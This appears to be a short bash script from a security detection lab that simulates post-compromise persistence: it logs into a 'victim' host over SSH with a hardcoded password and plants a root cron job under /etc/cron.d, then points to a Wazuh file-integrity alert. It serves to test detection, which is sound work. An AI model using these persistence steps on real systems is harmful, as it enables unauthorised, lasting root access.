#!/usr/bin/env bash
# Scenario 2: post-compromise persistence via a cron job (MITRE T1053.003).
# The victim's FIM watches /etc/cron.d, so writing there should raise a
# syscheck "file added" alert on top of the SSH activity.
set -uo pipefail
TARGET="${1:-victim}"
PW="${2:-Summer2024!}"
echo "[*] Planting a cron persistence job on ${TARGET}..."

sshpass -p "$PW" ssh -o StrictHostKeyChecking=no "deploy@${TARGET}" \
  "echo '* * * * * root /bin/bash -c \"id > /tmp/beacon\"' | sudo tee /etc/cron.d/lab-persist"

echo "[*] Done. Check Wazuh for a syscheck alert on /etc/cron.d."
